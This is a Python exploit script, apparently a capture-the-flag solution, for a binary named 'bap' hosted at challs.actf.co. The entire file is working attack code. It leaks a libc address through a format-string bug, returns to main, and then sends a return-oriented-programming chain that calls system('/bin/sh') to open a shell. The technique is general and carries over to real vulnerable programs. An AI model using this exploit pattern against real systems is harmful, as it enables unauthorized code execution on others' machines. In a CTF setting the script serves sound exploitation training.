#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./bap_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("challs.actf.co", 31323)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    offset = 24
    payload = f"#%29$lx#".encode()
    payload += b"A" * (offset - len(payload))
    payload += ptr.p64(next(elf.gadget("ret;")))
    payload += ptr.p64(unwrap(elf.symbol("main")))
    io.sendline(payload)
    io.recvuntil(b"#")
    libc.base = int(io.recvuntil(b"#").strip(b"#").decode(), 16) - 0x29E40
    payload = b"A" * offset
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\x00")))
    payload += ptr.p64(unwrap(libc.symbol("system")))
    io.sendline(payload)

    io.sh()


if __name__ == "__main__":
    main()
